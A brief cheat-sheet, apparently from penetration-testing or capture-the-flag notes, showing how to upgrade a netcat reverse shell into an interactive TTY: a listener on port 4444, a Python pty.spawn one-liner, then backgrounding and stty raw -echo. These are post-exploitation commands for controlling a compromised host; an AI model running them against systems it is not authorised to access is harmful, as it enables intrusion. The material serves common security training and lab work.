# Spawn Python TTY Shell

*Use this to create an interactive shell when using netcat*

```bash
nc -lnvp 4444
```
```bash
python -c 'import pty;pty.spawn("bash")'
```
```
^Z # Ctrl-Z
```
```bash
stty raw -echo
```
```
fg
```